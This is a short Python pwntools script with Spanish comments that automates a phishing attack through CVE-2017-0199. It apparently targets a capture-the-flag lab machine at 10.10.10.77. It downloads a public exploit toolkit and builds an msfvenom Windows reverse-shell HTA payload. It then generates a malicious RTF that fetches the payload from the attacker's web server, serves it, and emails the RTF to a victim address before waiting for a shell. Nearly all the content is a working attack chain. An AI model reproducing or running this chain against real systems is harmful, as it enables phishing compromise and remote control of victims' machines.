from pwn import *

IP = sys.argv[1]
print(IP)

# Descargar el Exploit CVE
p = process("wget https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/master/cve-2017-0199_toolkit.py",shell=True)

# Create Metasploit payload
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.48 LPORT=443 -f hta-psh -o rshell.hta
p = process(["msfvenom","-p","windows/shell_reverse_tcp","LHOST="+IP,"LPORT=443","-f","hta-psh","-o","rshell.hta"])
p.recvline()

# Crear el archivo que utilizaremos para Phishing
# python cve-2017-0199_toolkit.py -M gen -w redteamrd.rtf -u http://10.10.15.248/rshell.hta -t rtf -x 0
p = process(["python","cve-2017-0199_toolkit.py","-M","gen","-w","redteamrd.rtf","-u","http://"+IP+"/rshell.hta","-t","rtf","-x","0"])
print(p.recvline())

# python3 -m http.server 80
webserver = process(["python3","-m","http.server","80"])

# sendEmail -f redteamrd@megabank.com -t nico@megabank.com -u "RedTeamRD" -m "Saludos Tangui" -a redteamrd.rtf -s 10.10.10.77 -v
p = process(["sendEmail","-f","redteamrd@megabank.com","-t","nico@megabank.com","-u","RedTeamRD","-m","Saludos-Tangui","-a","redteamrd.rtf","-s","10.10.10.77"])
print(p.recvline())

input("Precione Enter cuando tenga el shell...")
#",""https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/master/cve-2017-0199_toolkit.py"
